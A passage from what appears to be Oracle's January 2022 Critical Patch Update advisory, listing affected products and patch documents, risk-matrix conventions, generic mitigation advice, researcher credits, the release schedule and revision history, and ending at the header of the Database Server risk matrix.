| [Oracle Communications WebRTC Session Controller, versions 7.2.0, 7.2.1](#AppendixCGBU) | [Oracle Communications WebRTC Session Controller](https://support.oracle.com/rs?type=doc&id=2833614.1) |
| [Oracle Data Integrator, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Database Server, versions 12.1.0.2, 12.2.0.1, 19c, 21c](#AppendixDB) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Demantra Demand Management, versions 12.2.6-12.2.11](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2832006.1) |
| [Oracle E-Business Suite, versions 12.2.3-12.2.11](#AppendixEBS) | [Oracle E-Business Suite](https://support.oracle.com/rs?type=doc&id=2484000.1) |
| [Oracle Enterprise Communications Broker, version 3.3](#AppendixCGBU) | [Oracle Enterprise Communications Broker](https://support.oracle.com/rs?type=doc&id=2833087.1) |
| [Oracle Enterprise Data Quality, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Enterprise Session Border Controller, versions 8.4, 9.0](#AppendixCGBU) | [Oracle Enterprise Session Border Controller](https://support.oracle.com/rs?type=doc&id=2833085.1) |
| [Oracle Essbase, versions prior to 11.1.2.4.47, prior to 21.3](#AppendixESSB) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Essbase Administration Services, versions prior to 11.1.2.4.47](#AppendixESSB) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Financial Services Analytical Applications Infrastructure, versions 8.0.7-8.1.1](#AppendixIFLX) | [Oracle Financial Services Analytical Applications Infrastructure](https://support.oracle.com/rs?type=doc&id=2825591.1) |
| [Oracle Financial Services Behavior Detection Platform, versions 8.0.7, 8.0.8, 8.1.1](#AppendixIFLX) | [Oracle Financial Services Behavior Detection Platform](https://support.oracle.com/rs?type=doc&id=2832147.1) |
| [Oracle Financial Services Enterprise Case Management, versions 8.0.7, 8.0.8, 8.1.1](#AppendixIFLX) | [Oracle Financial Services Enterprise Case Management](https://support.oracle.com/rs?type=doc&id=2832152.1) |
| [Oracle Financial Services Foreign Account Tax Compliance Act Management, versions 8.0.7, 8.0.8, 8.1.1](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Financial Services Model Management and Governance, versions 8.0.8-8.1.1](#AppendixIFLX) | [Oracle Financial Services Model Management and Governance](https://support.oracle.com/rs?type=doc&id=2825611.1) |
| [Oracle Financial Services Trade-Based Anti Money Laundering Enterprise Edition, versions 8.0.7, 8.0.8](#AppendixIFLX) | [Oracle Financial Services Trade-Based Anti Money Laundering Enterprise Edition](https://support.oracle.com/rs?type=doc&id=2833718.1) |
| [Oracle FLEXCUBE Investor Servicing, versions 12.0.4, 12.1.0, 12.3.0, 12.4.0, 14.4.0, 14.5.0](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle FLEXCUBE Private Banking, versions 12.0.0, 12.1.0](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Fusion Middleware, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Fusion Middleware MapViewer, version 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle GoldenGate, versions prior to 12.3.0.1, prior to 19.1.0.0.220118, prior to 21.4.0.0.0, prior to 21.5.0.0.220118](#AppendixGG) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle GraalVM Enterprise Edition, versions 20.3.4, 21.3.0](#AppendixJAVA) | [Java SE](https://support.oracle.com/rs?type=doc&id=2828114.1) |
| [Oracle Graph Server and Client, versions prior to 21.4](#AppendixGSC) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Health Sciences Clinical Development Analytics, version 4.0.1](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2827314.1) |
| [Oracle Health Sciences InForm CRF Submit, version 6.2.1](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2827314.1) |
| [Oracle Health Sciences Information Manager, versions 3.0.2, 3.0.3](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2827318.1) |
| [Oracle Healthcare Data Repository, versions 7.0.2, 8.1.0, 8.1.1](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2827318.1) |
| [Oracle Healthcare Foundation, versions 7.3.0.0-7.3.0.2, 8.0.0-8.0.2, 8.1.0-8.1.1](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2827318.1) |
| [Oracle Healthcare Translational Research, version 4.1.0](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2827318.1) |
| [Oracle Hospitality Cruise Shipboard Property Management System, version 20.1.0](#AppendixHOSP) | [Oracle Hospitality Cruise Shipboard Property Management System](https://support.oracle.com/rs?type=doc&id=2824526.1) |
| [Oracle Hospitality OPERA 5, version 5.6](#AppendixHOSP) | [Oracle Hospitality OPERA 5 Property Services](https://support.oracle.com/rs?type=doc&id=2824790.1) |
| [Oracle Hospitality Reporting and Analytics, version 9.1.0](#AppendixFBBU) | [Oracle Hospitality Reporting and Analytics](https://support.oracle.com/rs?type=doc&id=2825723.1) |
| [Oracle Hospitality Suite8, versions 8.10.2, 8.11.0, 8.12.0, 8.13.0, 8.14.0](#AppendixHOSP) | [Oracle Hospitality Suite8](https://support.oracle.com/rs?type=doc&id=2824342.1) |
| [Oracle HTTP Server, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Hyperion Infrastructure Technology, version 11.2.7.0](#AppendixHYP) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle iLearning, versions 6.2, 6.3](#AppendixILRN) | [iLearning](https://support.oracle.com/rs?type=doc&id=2832007.1) |
| [Oracle Insurance Data Gateway, versions 11.0.2, 11.1.0, 11.2.7, 11.3.0, 11.3.1](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2832476.1) |
| [Oracle Insurance Insbridge Rating and Underwriting, versions 5.2.0, 5.4.0-5.6.0](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2832476.1) |
| [Oracle Insurance Policy Administration, versions 11.0.2, 11.1.0, 11.2.7, 11.3.0, 11.3.1](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2832476.1) |
| [Oracle Insurance Policy Administration J2EE, versions 10.2.0, 10.2.4, 11.0.2, 11.1.0-11.3.0](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2832476.1) |
| [Oracle Insurance Rules Palette, versions 10.2.0, 10.2.4, 11.0.2, 11.1.0-11.3.0, 11.3.1](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2832476.1) |
| [Oracle Java SE, versions 7u321, 8u311, 11.0.13, 17.0.1](#AppendixJAVA) | [Java SE](https://support.oracle.com/rs?type=doc&id=2828114.1) |
| [Oracle Managed File Transfer, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle NoSQL Database, versions prior to 21.1.12](#AppendixNSQL) | [NoSQL Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Policy Automation, versions 12.2.0-12.2.24](#AppendixPOLI) | [Oracle Policy Automation](https://support.oracle.com/rs?type=doc&id=2832841.1) |
| [Oracle Product Lifecycle Analytics, version 3.6.1](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2832006.1) |
| [Oracle Rapid Planning, versions 12.2.6-12.2.11](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2832006.1) |
| [Oracle Real User Experience Insight, versions 13.4.1.0, 13.5.1.0](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle REST Data Services, versions prior to 21.2.4](#AppendixREST) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Retail Allocation, versions 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Analytics, versions 16.0.0-16.0.2](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Assortment Planning, version 16.0.3](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Back Office, version 14.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Central Office, version 14.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Customer Insights, versions 16.0.0-16.0.2](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Customer Management and Segmentation Foundation, versions 16.0-19.0](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail EFTLink, versions 16.0.3, 17.0.2, 18.0.1, 19.0.1, 20.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Extract Transform and Load, version 13.2.8](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Financial Integration, versions 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Fiscal Management, version 14.2](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Integration Bus, versions 14.1.3.0, 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Invoice Matching, versions 15.0.3, 16.0.3](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Merchandising System, version 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Order Broker, versions 16.0, 18.0, 19.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Order Management System, version 19.5](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Point-of-Service, version 14.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Predictive Application Server, versions 14.1.3, 14.1.3.46, 15.0.3, 15.0.3.115, 16.0.3, 16.0.3.240](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Price Management, versions 13.2, 14.0.4, 14.1, 14.1.3, 15, 15.0.3, 16, 16.0.3](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Returns Management, version 14.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Service Backbone, versions 14.1.3.0, 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Size Profile Optimization, version 16.0.3](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle Retail Xstore Point of Service, versions 17.0.4, 18.0.3, 19.0.2, 20.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2826068.1) |
| [Oracle SD-WAN Aware, version 8.2](#AppendixCGBU) | [Oracle SD-WAN Aware](https://support.oracle.com/rs?type=doc&id=2833597.1) |
| [Oracle SD-WAN Edge, versions 9.0, 9.1](#AppendixCGBU) | [Oracle SD-WAN Edge](https://support.oracle.com/rs?type=doc&id=2833604.1) |
| [Oracle Secure Backup, versions prior to 18.1.0.1.0](#AppendixOSB) | [Oracle Secure Backup](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Solaris, versions 10, 11](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2832878.1) |
| [Oracle Spatial Studio, versions prior to 21.2.1](#AppendixSPS) | [Database](https://support.oracle.com/rs?type=doc&id=2832117.1) |
| [Oracle Thesaurus Management System, versions 5.2.3, 5.3.0, 5.3.1](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2827314.1) |
| [Oracle TimesTen In-Memory Database, versions prior to 11.2.2.8.27, prior to 21.1.1.1.0](#AppendixXTEN) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Utilities Framework, versions 4.2.0.2.0, 4.2.0.3.0, 4.3.0.1.0-4.3.0.6.0, 4.4.0.0.0, 4.4.0.2.0, 4.4.0.3.0](#AppendixUTIL) | [Oracle Utilities Applications](https://support.oracle.com/rs?type=doc&id=2832617.1) |
| [Oracle Utilities Testing Accelerator, versions 6.0.0.1.1, 6.0.0.2.2, 6.0.0.3.1](#AppendixUTIL) | [Oracle Utilities Applications](https://support.oracle.com/rs?type=doc&id=2832617.1) |
| [Oracle VM VirtualBox, versions prior to 6.1.32](#AppendixOVIR) | [Virtualization](https://support.oracle.com/rs?type=doc&id=2833279.1) |
| [Oracle WebCenter Portal, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle WebLogic Server, versions 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle ZFS Storage Appliance Kit, version 8.8](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2832878.1) |
| [Oracle ZFS Storage Application Integration Engineering Software, version 1.3.3](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2832878.1) |
| [OSS Support Tools, versions prior to 2.12.42](#AppendixTOOL) | [Oracle Support Tools](https://support.oracle.com/rs?type=doc&id=2833277.1) |
| [PeopleSoft Enterprise CS SA Integration Pack, versions 9.0, 9.2](#AppendixPS) | [PeopleSoft](https://support.oracle.com/rs?type=doc&id=2831970.1) |
| [PeopleSoft Enterprise PeopleTools, versions 8.57, 8.58, 8.59](#AppendixPS) | [PeopleSoft](https://support.oracle.com/rs?type=doc&id=2831970.1) |
| [Primavera Analytics, versions 18.8.3.3, 19.12.11.1, 20.12.12.0](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2829871.1) |
| [Primavera Data Warehouse, versions 18.8.3.3, 19.12.11.1, 20.12.12.0](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2829871.1) |
| [Primavera Gateway, versions 17.12.0-17.12.11, 18.8.0-18.8.13, 19.12.0-19.12.12, 20.12.0-20.12.7, 21.12.0](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2829871.1) |
| [Primavera P6 Enterprise Project Portfolio Management, versions 17.12.0.0-17.12.20.0, 18.8.0.0-18.8.24.0, 19.12.0.0-19.12.18.0, 20.12.0.0-20.12.12.0, 21.12.0.0](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2829871.1) |
| [Primavera P6 Professional Project Management, versions 17.12.0.0-17.12.20.0, 18.8.0.0-18.8.24.0, 19.12.0.0-19.12.17.0, 20.12.0.0-20.12.9.0](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2829871.1) |
| [Primavera Portfolio Management, versions 18.0.0.0-18.0.3.0, 19.0.0.0-19.0.1.2, 20.0.0.0, 20.0.0.1](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2829871.1) |
| [Primavera Unifier, versions 17.7-17.12, 18.8, 19.12, 20.12, 21.12](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2829871.1) |
| [Siebel Applications, versions 21.12 and prior](#AppendixSECR) | [Siebel](https://support.oracle.com/rs?type=doc&id=2832003.1) |

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujan2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

### Credit Statement

The following people or organizations reported security vulnerabilities addressed by this Critical Patch Update to Oracle:

* Abdelrhman Yousri: CVE-2022-21246, CVE-2022-21402, CVE-2022-21403
* Alexander Kornbrust of Red Database Security: CVE-2022-21247
* Andrej Simko of Accenture: CVE-2022-21251
* Anonymous researcher working with Trend Micro's Zero Day Initiative: CVE-2022-21279, CVE-2022-21280, CVE-2022-21284, CVE-2022-21285, CVE-2022-21286, CVE-2022-21287, CVE-2022-21288, CVE-2022-21289, CVE-2022-21290, CVE-2022-21307, CVE-2022-21308, CVE-2022-21309, CVE-2022-21346
* Aobo Wang of Chaitin Security Research Lab: CVE-2022-21295
* Dan Rabe: CVE-2022-21296
* Dinh Ho Anh Khoa of Viettel Cyber Security: CVE-2022-21306
* Fabian Meumertzheim of Code Intelligence: CVE-2022-21360, CVE-2022-21366
* Frederic Quenneville of videotron.com: CVE-2022-21338
* Hamed Ashraf: CVE-2022-21395, CVE-2022-21396, CVE-2022-21397, CVE-2022-21398, CVE-2022-21399, CVE-2022-21400, CVE-2022-21401
* Hans Christian Woithe: CVE-2021-43395
* Harold Siyu Zang of Trustwave: CVE-2022-21381, CVE-2022-21382, CVE-2022-21383
* Jangggg of VNPT: CVE-2021-35587
* Jeremy Nunn of Trustwave: CVE-2022-21383
* Jie Liang of WingTecher Lab of Tsinghua University: CVE-2022-21303, CVE-2022-21304
* Jingzhou Fu of WingTecher Lab of Tsinghua University: CVE-2022-21303, CVE-2022-21304
* Jonah T: CVE-2022-21371
* Jonni Passki of Apple Information Security: CVE-2022-21282
* Kun Yang of Chaitin Security Research Lab: CVE-2022-21295
* Liboheng of Tophant Starlight laboratory: CVE-2022-21261
* Longofo of Knownsec 404 Team: CVE-2022-21252, CVE-2022-21260
* Lucas Leong (wmliang) of Trend Micro Zero Day Initiative: CVE-2022-21310, CVE-2022-21311, CVE-2022-21312, CVE-2022-21313, CVE-2022-21314, CVE-2022-21315, CVE-2022-21316, CVE-2022-21317, CVE-2022-21318, CVE-2022-21319, CVE-2022-21320, CVE-2022-21321, CVE-2022-21322, CVE-2022-21323, CVE-2022-21324, CVE-2022-21325, CVE-2022-21326, CVE-2022-21327, CVE-2022-21328, CVE-2022-21329, CVE-2022-21330, CVE-2022-21331, CVE-2022-21332, CVE-2022-21333, CVE-2022-21334, CVE-2022-21335, CVE-2022-21336, CVE-2022-21337, CVE-2022-21355, CVE-2022-21356, CVE-2022-21357, CVE-2022-21380
* Markus Loewe: CVE-2022-21293, CVE-2022-21294
* Matei "Mal" Badanoiu: CVE-2022-21392
* osword from SGLAB of Legendsec at Qi'anxin Group: CVE-2022-21347
* Patrick Star of BMH Security Team: CVE-2022-21353
* peterjson - Security Engineering - VNG Corporation: CVE-2021-35587
* r00t4dm: CVE-2022-21252, CVE-2022-21257, CVE-2022-21258, CVE-2022-21259, CVE-2022-21260, CVE-2022-21261, CVE-2022-21262
* RE:HACK: CVE-2022-21373
* Reno Robert working with Trend Micro Zero Day Initiative: CVE-2022-21355, CVE-2022-21356, CVE-2022-21357, CVE-2022-21380
* Ryota Shiga (Ga\_ryo\_) of Flatt Security working with Trend Micro Zero Day Initiative: CVE-2022-21394
* Sander Meijering of HackDefense:  CVE-2022-21371
* Thijmen Kooy of HackDefense:  CVE-2022-21371
* thiscodecc of MoyunSec V-Lab: CVE-2022-21292, CVE-2022-21350, CVE-2022-21361
* Victor Rodriguez: CVE-2022-21364
* Yaoguang Chen of Ant Security Light-Year Lab: CVE-2022-21303, CVE-2022-21304
* Zhiqiang Zang of University of Texas at Austin: CVE-2022-21305
* Zhiyong Wu of WingTecher Lab of Tsinghua University: CVE-2022-21303, CVE-2022-21304

#### Security-In-Depth Contributors

Oracle acknowledges people who have contributed to our Security-In-Depth program (see [FAQ](/security-alerts/cpufaq.html)). People are acknowledged for Security-In-Depth contributions if they provide information, observations or suggestions pertaining to security vulnerability issues that result in significant modification of Oracle code or documentation in future releases, but are not of such a critical nature that they are distributed in Critical Patch Updates.

In this Critical Patch Update, Oracle recognizes the following for contributions to Oracle's Security-In-Depth program:

* Huixin Ma of Tencent.com [2 reports]
* Liying Wang
* Longofo of Knownsec 404 Team
* r00t4dm
* Robin Textor

#### On-Line Presence Security Contributors

Oracle acknowledges people who have contributed to our On-Line Presence Security program (see [FAQ](/security-alerts/cpufaq.html)). People are acknowledged for contributions relating to Oracle's on-line presence if they provide information, observations or suggestions pertaining to security-related issues that result in significant modification to Oracle's on-line external-facing systems.

For this quarter, Oracle recognizes the following for contributions to Oracle's On-Line Presence Security program:

* Abderrahmane Elghoul
* Abilash V L
* Abisheik M
* Adam Willard
* Aleena Avarachan
* Ali Alzahrani
* Aniket Nimkar
* Ashik Kunjumon
* B.Dhiyaneshwaran aka (Geek Freak) [2 reports]
* Dhanesh Sivasamy
* Dor Tumarkin, Principal Application Security Researcher at Checkmarx
* Gaurang Maheta [2 reports]
* Jangggg of VNPT
* Kishore Hariram
* Lidor Ben Shitrit from Orca Security
* Lokesh Rulz
* Malicious.Group
* Mohit Ahir
* N3td1v3r
* Nightwatch Cybersecurity Research
* peterjson - Security Engineering - VNG Corporation
* pinkflower
* Quan Doan of R&D Center - VinCSS LLC (a member of Vingroup)
* Rahul PS
* Rob Evans of Fortinet, Inc.
* Rounak Sharma
* Sakhare Vinayak
* Samprit Das (sampritdas8)
* Saptak Saha
* Shubham Choudhery
* Shuvam Adhikari [4 reports]
* Srikar V - exp1o1t9r
* Truffle Security Co
* Yeswanth Reddy

### Critical Patch Update Schedule

Critical Patch Updates are released on the Tuesday closest to the 17th day of January, April, July and October. The next four dates are:

* 19 April 2022
* 19 July 2022
* 18 October 2022
* 17 January 2023

### References

* [Oracle Critical Patch Updates, Security Alerts and Bulletins](https://www.oracle.com/security-alerts)
* [Critical Patch Update - January 2022 Documentation Map](https://support.oracle.com/rs?type=doc&id=2832427.1)
* [Oracle Critical Patch Updates and Security Alerts - Frequently Asked Questions](/security-alerts/cpufaq.html)
* [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)
* [Use of Common Vulnerability Scoring System (CVSS) by Oracle](/security-alerts/cvssscoringsystem.html)
* [English text version of the risk matrices](/security-alerts/cpujan2022verbose.html)
* [CVRF XML version of the risk matrices](https://www.oracle.com/docs/tech/security-alerts/cpujan2022cvrf.xml)
* [Map of CVE to Advisory/Alert](/security-alerts/public-vuln-to-advisory-mapping.html)
* [Oracle Lifetime support Policy](https://www.oracle.com/support/lifetime-support/resources.html)
* [JEP 290 Reference Blocklist Filter](https://support.oracle.com/rs?type=doc&id=2591118.1)

### Modification History

| Date | Note |
| --- | --- |
| 2024-December-23 | Rev 7. Corrected the CVE credits for WebLogic bugs |
| 2022-March-14 | Rev 6. Updated the version details and addtional CVEs (CVE-2022-23302, CVE-2022-23305 and CVE-2022-23307) for Oracle WebLogic Server |
| 2022-Januray-31 | Rev 5. Version details updated for Oracle HTTP Server and Oracle Business Activity Monitoring |
| 2022-Januray-27 | Rev 4. Retail matrix version changes and added credit for CVE-2022-21353 |
| 2022-Januray-24 | Rev 3. CVSS update for CVE-2022-21392 and aded credit for CVE-2022-21346 |
| 2022-January-18 | Rev 2. Updated Siebel Applications versions and added couple of credit names |
| 2022-January-18 | Rev 1. Initial Release |

#### Oracle Database Products Risk Matrices

This Critical Patch Update contains 28 new security patches for Oracle Database Products divided as follows:

* 4 new security patches for Oracle Database Products
* 1 new security patch for Oracle Airlines Data Model
* 2 new security patches for Oracle Big Data Graph
* 1 new security patch for Oracle Communications Data Model
* 4 new security patches for Oracle Essbase
* 3 new security patches for Oracle GoldenGate
* 2 new security patches for Oracle Graph Server and Client
* 1 new security patch for Oracle NoSQL Database
* 2 new security patches for Oracle REST Data Services
* 2 new security patches for Oracle Secure Backup
* 1 new security patch for Oracle Spatial Studio
* 5 new security patches for Oracle TimesTen In-Memory Database

#### Oracle Database Server Risk Matrix

This Critical Patch Update contains 4 new security patches plus additional third party patches noted below for Oracle Database Products.  None of these vulnerabilities may be remotely exploitable without authentication, i.e., none may be exploited over a network without requiring user credentials.  None of these patches are applicable to client-only installations, i.e., installations that do not have the Oracle Database Server installed. The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#DB)

| CVE# | Component | Package and/or Privilege Required | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
